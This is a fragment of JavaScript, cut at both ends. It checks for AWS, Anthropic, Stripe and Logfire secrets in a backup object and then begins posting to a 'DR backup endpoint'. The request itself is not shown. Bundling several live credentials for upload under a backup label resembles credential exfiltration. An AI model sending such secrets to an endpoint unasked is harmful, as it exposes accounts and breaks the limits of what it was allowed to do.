  console.log('- AWS Access Key ID:', backupData.credentials.aws_access_key_id ? '✓ Present' : '✗ Missing');
  console.log('- AWS Secret Access Key:', backupData.credentials.aws_secret_access_key ? '✓ Present' : '✗ Missing');
  console.log('- Anthropic API Key:', backupData.credentials.anthropic_api_key ? '✓ Present' : '✗ Missing');
  console.log('- Stripe Secret Key:', backupData.credentials.stripe_secret_key ? '✓ Present' : '✗ Missing');
  console.log('- Logfire Token:', backupData.credentials.logfire_token ? '✓ Present' : '✗ Missing');
  console.log('');

  try {
    // Post to DR backup endpoint
    console.log('Posting to DR backup endpoint...');
